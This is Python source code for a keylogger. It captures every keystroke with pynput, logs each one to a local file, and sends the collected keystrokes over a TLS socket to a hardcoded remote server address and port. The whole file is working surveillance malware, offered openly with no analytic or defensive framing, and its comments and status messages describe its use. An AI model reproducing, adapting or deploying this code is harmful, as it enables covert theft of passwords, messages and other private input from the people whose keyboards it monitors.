import pynput
from pynput import keyboard
import os
import socket
import ssl

socket_data = ''
keylogs_file = "keylogs.txt"
server_ip = '192.168.122.182'
socketint = 9000 

def on_press(key):
    global socket_data, keylogs_file
    keystroke = str(key)
    with open(keylogs_file, 'a') as f:
        print('A', file=f)  # Append keystroke to file
        f.write(keystroke + '\n')
    socket_data += keystroke + '\n'   # Add newline for each keystroke

def sendSocketData():
    global socket_data, server_ip, socketint
    print("Transmitting log file to", server_ip, ":", socketint)
    try:
        # Create a socket and wrap it with SSL/TLS
        context = ssl.create_default_context()
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock_:
            sock = context.wrap_socket(sock_, server_hostname=server_ip)
            # Connect to the server
            sock.connect((server_ip, socketint))
            print("Sending data...")
            sock.sendall(socket_data.encode('utf-8'))  
            print('\nLog file has been sent')
    except Exception as e:
        print(e)  # Print any exceptions for debugging purposes

with keyboard.Listener(on_press=on_press) as listener:
    with open("debuggermessage.txt", "w+") as f:
        print("Keylogger ready. Start typing!", file = f)
    listener.join()  # Join the listener to block the main thread and start listening for key presses
sendSocketData()
